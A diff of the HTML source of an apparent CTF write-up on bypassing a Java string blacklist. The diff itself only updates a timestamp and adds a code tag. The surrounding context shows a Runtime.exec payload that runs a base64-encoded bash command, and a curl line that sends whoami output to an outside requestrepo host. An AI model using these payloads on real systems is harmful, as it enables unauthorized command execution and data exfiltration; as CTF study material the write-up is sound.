@@ -49,7 +49,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184457111.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184506559.png">
 <meta property="article:published_time" content="2024-02-19T03:10:21.000Z">
-<meta property="article:modified_time" content="2024-02-20T16:27:15.369Z">
+<meta property="article:modified_time" content="2024-02-20T17:20:07.556Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240221001812164.png">
@@ -543,7 +543,7 @@ list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\u&
 list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\x&quot;</span>);
 list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>);</code></pre></div>
 
-<h3 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h3><p>利用ScriptEngineManager获取js，利用js的String.fromCharCode进行绕过</p>
+<h3 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h3><p>利用ScriptEngineManager获取js，利用js的<code>String.fromCharCode</code>进行绕过</p>
 <div class="code-wrapper"><pre><code class="hljs autohotkey">curl `whoami`.vabueyf6.requestrepo.com</code></pre></div>
 
 <div class="code-wrapper"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC52YWJ1ZXlmNi5yZXF1ZXN0cmVwby5jb20=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</code></pre></div>
